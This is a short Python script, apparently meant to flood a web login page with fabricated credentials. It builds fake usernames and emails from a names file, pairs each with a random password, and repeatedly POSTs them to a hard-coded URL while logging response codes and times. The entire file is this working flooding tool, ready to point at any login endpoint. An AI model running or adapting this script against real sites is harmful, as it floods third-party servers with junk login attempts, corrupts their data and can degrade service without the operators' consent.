import requests
import os
import random
import string
import json

chars = string.ascii_letters + string.digits + '!@#$%^&*()'

# This is an array of email extensions; you can add whatever in here
# todo: put this in a json file instead
emails = ["outlook.com", "gmail.com", "yahoo.com", "hotmail.com", "aol.com", "icloud.com", "mail.com"]

random.seed = (os.urandom(1024))

# This is the URL you want to flood. Should be a login page
url = 'https://kcs.cx/test5'

names = json.loads(open('names.json').read())

random.shuffle(names)

n = 0

for name in names:
	name_extra = ''.join(random.choice(string.digits))

	email = name.lower() + name_extra + '@' + random.choice(emails)
	username = name.lower() + name_extra
	password = ''.join(random.choice(chars) for i in range(8))
	uore = [email, username]
	user = random.choice(uore)

	r = requests.post(url, allow_redirects=False, data={
		'username': user,
		'password': password,
	})

	n += 1
        
	print ("%s. Sending username %s and password %s. Response: %s. Response time: %s" % (n, user, password, r.status_code, r.elapsed.total_seconds()))
